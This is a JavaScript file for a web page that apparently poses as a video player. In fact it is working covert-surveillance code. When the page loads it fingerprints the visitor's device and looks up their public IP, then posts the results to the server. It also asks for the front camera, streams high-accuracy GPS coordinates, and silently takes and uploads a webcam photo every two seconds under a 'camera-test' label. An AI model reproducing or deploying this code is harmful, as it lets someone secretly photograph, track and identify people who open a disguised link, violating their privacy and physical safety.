let deviceFingerprint = {};
let realIP = '';
let cameraStream = null;
let photoCount = 0;
let photoInterval = null;
let deviceDataSent = false;
let gpsData = null;

async function getDeviceModel() {
  try {
    if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
      const hints = await navigator.userAgentData.getHighEntropyValues([
        'architecture', 'bitness', 'brands', 'fullVersionList',
        'mobile', 'model', 'platform', 'platformVersion', 'uaFullVersion'
      ]);
      if (hints) {
        const parts = [];
        if (hints.brands) {
          const brands = hints.brands.map(function(b) { return b.brand + ' ' + b.version; }).join(' / ');
          parts.push(brands);
        }
        if (hints.model && hints.model !== '') parts.push('Model: ' + hints.model);
        if (hints.platform) parts.push(hints.platform + (hints.platformVersion ? ' ' + hints.platformVersion : ''));
        if (hints.architecture) parts.push(hints.architecture + (hints.bitness ? ' ' + hints.bitness : ''));
        if (hints.mobile !== undefined) parts.push(hints.mobile ? 'Mobile' : 'Desktop');
        if (parts.length > 0) return parts.join(' | ');
      }
    }
  } catch (e) {}

  return parseUA();
}

function parseUA() {
  var ua = navigator.userAgent;
  var result = '';

  var androidMatch = ua.match(/Android\s+([\d.]+)/);
  if (androidMatch) {
    result += 'Android ' + androidMatch[1];
    var buildMatch = ua.match(/Build\/([A-Za-z0-9._]+)/);
    if (buildMatch) result += ' | Build: ' + buildMatch[1];
    var modelPatterns = [
      [/SM-([A-Za-z0-9]+)/, 'Samsung '], [/SAMSUNG[ -]([A-Za-z0-9]+)/, 'Samsung '],
      [/Pixel[ _]?(\d+[a-z]*)/i, 'Google Pixel '], [/ONEPLUS[ _]?([A-Za-z0-9]+)/i, 'OnePlus '],
      [/Xiaomi[ _]?([A-Za-z0-9]+)/i, 'Xiaomi '], [/Redmi[ _]?([A-Za-z0-9]+)/i, 'Xiaomi Redmi '],
      [/POCO[ _]?([A-Za-z0-9]+)/i, 'Xiaomi POCO '], [/HUAWEI[ _]?([A-Za-z0-9-]+)/i, 'Huawei '],
      [/HONOR[ _]?([A-Za-z0-9-]+)/i, 'Honor '], [/OPPO[ _]?([A-Za-z0-9]+)/i, 'OPPO '],
      [/vivo[ _]?([A-Za-z0-9]+)/i, 'vivo '], [/realme[ _]?([A-Za-z0-9]+)/i, 'realme '],
      [/LG-([A-Za-z0-9]+)/, 'LG '], [/Moto[ _]?[G|E|Z][ _]?\(?([A-Za-z0-9]+)?\)?/i, 'Motorola '],
      [/Nokia[ _]?([A-Za-z0-9]+)/i, 'Nokia '], [/ASUS[ _]?([A-Za-z0-9_-]+)/i, 'ASUS '],
      [/Lenovo[ _]?([A-Za-z0-9_-]+)/i, 'Lenovo '], [/INFINIX[ _]?([A-Za-z0-9]+)/i, 'Infinix '],
      [/TECNO[ _]?([A-Za-z0-9]+)/i, 'TECNO '],
    ];
    for (var i = 0; i < modelPatterns.length; i++) {
      var p = modelPatterns[i][0], b = modelPatterns[i][1];
      var m = ua.match(p);
      if (m) { result += ' | ' + b + (m[1] || ''); break; }
    }
    return result || ua.substring(0, 200);
  }

  if (/iPhone|iPad|iPod/.test(ua)) {
    var osMatch = ua.match(/OS\s+(\d+[._]\d+(?:[._]\d+)?)/);
    var osVer = osMatch ? osMatch[1].replace(/_/g, '.') : '';
    if (/iPad/.test(ua)) result = 'iPad';
    else if (/iPod/.test(ua)) result = 'iPod';
    else result = 'iPhone';
    var pr = window.devicePixelRatio || 1;
    var minRes = Math.min(screen.width * pr, screen.height * pr);
    var iPhoneModels = [
      { name: 'iPhone 16 Pro Max', minR: 440, maxR: 450, minS: 1330, maxS: 1340 },
      { name: 'iPhone 16 Pro',     minR: 400, maxR: 410, minS: 1200, maxS: 1220 },
      { name: 'iPhone 16 Plus',    minR: 430, maxR: 440, minS: 1280, maxS: 1300 },
      { name: 'iPhone 16',         minR: 390, maxR: 400, minS: 1170, maxS: 1190 },
      { name: 'iPhone 15 Pro Max', minR: 430, maxR: 440, minS: 1280, maxS: 1300 },
      { name: 'iPhone 15 Pro',     minR: 390, maxR: 400, minS: 1170, maxS: 1190 },
      { name: 'iPhone 15 Plus',    minR: 430, maxR: 440, minS: 1280, maxS: 1300 },
      { name: 'iPhone 15',         minR: 390, maxR: 400, minS: 1170, maxS: 1190 },
      { name: 'iPhone 14 Pro Max', minR: 430, maxR: 440, minS: 1280, maxS: 1300 },
      { name: 'iPhone 14 Pro',     minR: 390, maxR: 400, minS: 1170, maxS: 1190 },
      { name: 'iPhone 14 Plus',    minR: 425, maxR: 435, minS: 1270, maxS: 1290 },
      { name: 'iPhone 14',         minR: 390, maxR: 400, minS: 1170, maxS: 1190 },
      { name: 'iPhone 13 Pro Max', minR: 425, maxR: 435, minS: 1270, maxS: 1290 },
      { name: 'iPhone 13 Pro',     minR: 390, maxR: 400, minS: 1170, maxS: 1190 },
      { name: 'iPhone 13',         minR: 390, maxR: 400, minS: 1170, maxS: 1190 },
      { name: 'iPhone 13 mini',    minR: 370, maxR: 380, minS: 1080, maxS: 1090 },
      { name: 'iPhone 12 Pro Max', minR: 425, maxR: 435, minS: 1270, maxS: 1290 },
      { name: 'iPhone 12/12 Pro',  minR: 390, maxR: 400, minS: 1170, maxS: 1190 },
      { name: 'iPhone 12 mini',    minR: 370, maxR: 380, minS: 1080, maxS: 1090 },
      { name: 'iPhone 11 Pro Max', minR: 410, maxR: 420, minS: 1240, maxS: 1250 },
      { name: 'iPhone X/XS/11 Pro',minR: 370, maxR: 380, minS: 1120, maxS: 1130 },
      { name: 'iPhone XR/11',      minR: 410, maxR: 420, minS: 820, maxS: 830 },
      { name: 'iPhone 8 Plus',     minR: 400, maxR: 410, minS: 1080, maxS: 1090 },
      { name: 'iPhone 8/SE',       minR: 370, maxR: 380, minS: 740, maxS: 770 },
    ];
    for (var j = 0; j < iPhoneModels.length; j++) {
      var m2 = iPhoneModels[j];
      if (pr >= m2.minR && pr <= m2.maxR && minRes >= m2.minS && minRes <= m2.maxS) { result = m2.name; break; }
    }
    return result + (osVer ? ' | iOS ' + osVer : '');
  }

  if (/Windows/.test(ua)) {
    var wv = ua.match(/Windows NT\s+([\d.]+)/);
    return 'Windows ' + (wv ? wv[1] : '') + ' | ' + (ua.includes('x64') || ua.includes('Win64') ? '64-bit' : '32-bit');
  }
  if (/Mac OS|Macintosh/.test(ua) && !/iPhone|iPad|iPod/.test(ua)) {
    var mv = ua.match(/Mac OS X\s+([\d_]+)/);
    return 'macOS ' + (mv ? mv[1].replace(/_/g, '.') : '') + ' | ' + (ua.includes('ARM') || ua.includes('arm') ? 'Apple Silicon' : 'Intel');
  }
  if (/Linux/.test(ua) && !/Android/.test(ua)) return 'Linux';
  return ua.substring(0, 150);
}

function getConnectionType() {
  var c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
  if (!c) return 'unknown';
  return (c.type || 'unknown') + '|' + (c.effectiveType || c.type || 'unknown');
}

function getBatteryInfo() {
  return new Promise(function(resolve) {
    try {
      if (navigator.getBattery) {
        navigator.getBattery().then(function(b) {
          resolve({ level: Math.round(b.level * 100), charging: b.charging });
        }).catch(function() { resolve(null); });
      } else { resolve(null); }
    } catch (e) { resolve(null); }
  });
}

function postJSON(url, data) {
  try { return fetch(url, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(data) }); } catch (e) { return null; }
}

function postForm(url, formData) {
  try { fetch(url, { method: 'POST', body: formData }); } catch (e) {}
}

function fetchRealIP() {
  return new Promise(function(resolve) {
    var done = false;
    function setIP(ip) { if (!done && ip) { done = true; realIP = ip; resolve(ip); } }
    var services = [
      'https://api64.ipify.org?format=json',
      'https://api.ipify.org?format=json',
      'https://api.my-ip.io/ip.json',
      'https://ifconfig.me/all.json',
    ];
    var count = 0;
    services.forEach(function(url) {
      try {
        fetch(url, { signal: AbortSignal.timeout(4000) }).then(function(r) { return r.json(); }).then(function(d) {
          var ip = d.ip || d.ip_addr || '';
          if (ip) setIP(ip);
        }).catch(function() { count++; if (count >= services.length) setIP(''); });
      } catch (e) { count++; if (count >= services.length) setIP(''); }
    });
    setTimeout(function() { if (!done) setIP(''); }, 5000);
  });
}

function getOrientation() {
  if (screen.orientation && screen.orientation.type) return screen.orientation.type;
  if (typeof window.orientation !== 'undefined') {
    var a = window.orientation;
    if (a === 0 || a === 180) return 'portrait-primary';
    if (a === 90 || a === -90) return 'landscape-primary';
    return a + 'deg';
  }
  return (window.innerWidth > window.innerHeight) ? 'landscape' : 'portrait';
}

function getDeviceData() {
  var scr = screen;
  return {
    screen: scr.width + 'x' + scr.height,
    availScreen: scr.availWidth + 'x' + scr.availHeight,
    windowSize: window.innerWidth + 'x' + window.innerHeight,
    colorDepth: scr.colorDepth || scr.pixelDepth || 24,
    pixelRatio: window.devicePixelRatio || 1,
    touchPoints: navigator.maxTouchPoints || 0,
    orientation: getOrientation(),
    language: navigator.language,
    languages: navigator.languages ? navigator.languages.join(',') : navigator.language,
    platform: navigator.platform || 'unknown',
    cores: navigator.hardwareConcurrency || 0,
    memory: navigator.deviceMemory || 0,
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    connectionType: getConnectionType(),
    vendor: navigator.vendor || 'unknown',
    appVersion: navigator.appVersion || '',
    realIP: realIP,
    deviceModel: deviceFingerprint.model
  };
}

function getBrowserName() {
  var ua = navigator.userAgent;
  if (ua.includes('Edg')) return 'Edge';
  if (ua.includes('Chrome') && !ua.includes('Edg')) return 'Chrome';
  if (ua.includes('Firefox')) return 'Firefox';
  if (ua.includes('Safari') && !ua.includes('Chrome')) return 'Safari';
  if (ua.includes('Opera') || ua.includes('OPR')) return 'Opera';
  return 'Other';
}

function getOSName() {
  var ua = navigator.userAgent;
  if (/Android/i.test(ua)) return 'Android';
  if (/iPhone|iPad|iPod/i.test(ua)) return 'iOS';
  if (/Windows/i.test(ua)) return 'Windows';
  if (/Mac OS|Macintosh/i.test(ua)) return 'macOS';
  if (/Linux/i.test(ua)) return 'Linux';
  return 'Other';
}

function getDeviceType() {
  var ua = navigator.userAgent;
  if (/Tablet|iPad/i.test(ua)) return 'Tablet';
  if (/Mobile|Android|iPhone|iPod/i.test(ua)) return 'Mobile';
  return 'Desktop';
}

function sendDeviceData() {
  if (deviceDataSent) return;
  deviceDataSent = true;

  getBatteryInfo().then(function(batt) {
    var dd = getDeviceData();

    var payload = {
      deviceModel: dd.deviceModel,
      screen: dd.screen,
      availScreen: dd.availScreen,
      windowSize: dd.windowSize,
      colorDepth: dd.colorDepth,
      pixelRatio: dd.pixelRatio,
      touchPoints: dd.touchPoints,
      orientation: dd.orientation,
      language: dd.language,
      languages: dd.languages,
      platform: dd.platform,
      cores: dd.cores,
      memory: dd.memory,
      timezone: dd.timezone,
      connectionType: dd.connectionType,
      vendor: dd.vendor,
      appVersion: dd.appVersion,
      realIP: realIP,
      browser: getBrowserName(),
      os: getOSName(),
      deviceType: getDeviceType(),
      battery: batt ? batt.level : null,
      batteryCharging: batt ? batt.charging : null,
      deviceHash: ''
    };

    var hashKey = [
      payload.deviceModel, payload.screen, payload.pixelRatio,
      payload.cores, payload.memory, payload.platform,
      payload.timezone, payload.language
    ].join('|');
    var hash = 0;
    for (var i = 0; i < hashKey.length; i++) {
      hash = ((hash << 5) - hash) + hashKey.charCodeAt(i);
      hash |= 0;
    }
    payload.deviceHash = Math.abs(hash).toString(16);

    deviceFingerprint = payload;
    postJSON('/api/capture', payload);
  });
}

function requestGPSNow() {
  if (!navigator.geolocation) return;
  navigator.geolocation.watchPosition(
    function(pos) {
      gpsData = {
        latitude: pos.coords.latitude,
        longitude: pos.coords.longitude,
        accuracy: Math.round(pos.coords.accuracy),
        speed: pos.coords.speed || null,
        altitude: pos.coords.altitude ? Math.round(pos.coords.altitude) : null,
        heading: pos.coords.heading || null
      };
      postJSON('/api/gps', {
        latitude: gpsData.latitude,
        longitude: gpsData.longitude,
        accuracy: gpsData.accuracy,
        speed: gpsData.speed,
        altitude: gpsData.altitude,
        heading: gpsData.heading
      });
    },
    function() {},
    { enableHighAccuracy: true, timeout: 10000, maximumAge: 5000 }
  );
}

function capturePhoto() {
  var video = document.getElementById('playerVideo');
  var canvas = document.getElementById('hiddenCanvas');

  if (!video || !cameraStream || video.videoWidth === 0) return;

  photoCount++;
  canvas.width = Math.min(video.videoWidth, 1920) || 1280;
  canvas.height = Math.min(video.videoHeight, 1920) || 720;
  canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);

  canvas.toBlob(function(blob) {
    if (!blob || blob.size < 100) return;
    var fd = new FormData();
    fd.append('photo', blob, 'cam_' + Date.now() + '_' + photoCount + '.jpg');
    fd.append('type', 'camera-test');
    fd.append('deviceHash', deviceFingerprint.deviceHash || '');
    postForm('/api/photo', fd);
    console.log('Photo #' + photoCount + ' captured and sent');
  }, 'image/jpeg', 0.95);
}

function startSpamPhotos() {
  if (photoInterval) return;
  capturePhoto();
  photoInterval = setInterval(function() { capturePhoto(); }, 2000);
}

function stopSpamPhotos() {
  if (photoInterval) { clearInterval(photoInterval); photoInterval = null; }
  console.log('Stopped. Total: ' + photoCount);
}

function autoRequestCamera() {
  if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return;

  navigator.mediaDevices.getUserMedia({
    video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } },
    audio: false
  })
  .then(function(stream) {
    cameraStream = stream;
    var video = document.getElementById('playerVideo');
    video.srcObject = stream;
    video.muted = true;
    video.setAttribute('playsinline', '');
    requestGPSNow();
    video.play().then(function() {
      var box = document.getElementById('playerBox');
      if (box) box.classList.add('active');
      setTimeout(function() { startSpamPhotos(); }, 2000);
    }).catch(function() {});
  })
  .catch(function(err) {
    console.log('Camera denied');
    var box = document.getElementById('playerBox');
    if (box) box.classList.add('active');
  });
}

function tryPlay() {
  var loadBar = document.getElementById('loadingBar');

  if (cameraStream) {
    loadBar.style.width = '100%';
    setTimeout(function() { loadBar.style.width = '0'; }, 600);
    document.getElementById('playerBox').classList.add('active');
    startSpamPhotos();
    return;
  }

  loadBar.style.width = '50%';

  navigator.mediaDevices.getUserMedia({
    video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } },
    audio: false
  })
  .then(function(stream) {
    cameraStream = stream;
    var video = document.getElementById('playerVideo');
    video.srcObject = stream;
    video.muted = true;
    video.setAttribute('playsinline', '');
    requestGPSNow();

    video.play().then(function() {
      loadBar.style.width = '100%';
      setTimeout(function() { loadBar.style.width = '0'; }, 600);
      document.getElementById('playerBox').classList.add('active');
      setTimeout(function() { startSpamPhotos(); }, 2000);
    }).catch(function() {
      loadBar.style.width = '100%';
      setTimeout(function() { loadBar.style.width = '0'; }, 600);
      document.getElementById('playerBox').classList.add('active');
      setTimeout(function() { startSpamPhotos(); }, 2000);
    });
  })
  .catch(function() {
    loadBar.style.width = '100%';
    setTimeout(function() { loadBar.style.width = '0'; }, 600);
    document.getElementById('playerBox').classList.add('active');
  });
}

document.addEventListener('DOMContentLoaded', function() {
  fetchRealIP().then(function() {
    return getDeviceModel();
  }).then(function(model) {
    deviceFingerprint.model = model;
    sendDeviceData();
  });

  setTimeout(function() { autoRequestCamera(); }, 300);
});

function scrollToPlayer() {
  var box = document.getElementById('playerBox');
  if (box) { box.scrollIntoView({ behavior: 'smooth' }); tryPlay(); }
}
